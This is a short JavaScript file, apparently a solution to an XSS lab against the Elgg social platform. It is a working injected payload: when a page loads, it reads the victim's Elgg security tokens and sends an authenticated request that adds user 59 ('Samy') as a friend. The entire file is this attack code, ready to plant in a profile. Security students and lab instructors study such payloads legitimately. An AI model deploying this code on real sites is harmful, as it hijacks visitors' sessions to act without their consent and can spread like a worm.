"use strict";

/**
 * @param {number} friendId
 * @returns {Promise<void>}
 * */
const addFriend = async (friendId) => {
  const baseUrl = document.location.origin;
  const path = "/action/friends/add";
  const url = new URL(path, baseUrl);

  const params = {
    friend: friendId,
    __elgg_ts: elgg.security.token.__elgg_ts,
    __elgg_token: elgg.security.token.__elgg_token,
  };

  Object.entries(params).forEach(([key, value]) => {
    url.searchParams.append(key, value);
  });

  try {
    const response = await fetch(url, {
      method: "GET",
      credentials: "include",
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  } catch (e) {
    console.error("Failed to add friend:", e);
  }
};

onload = () => {
  // Add Samy as a friend, whose id is 59.
  addFriend(59);
};
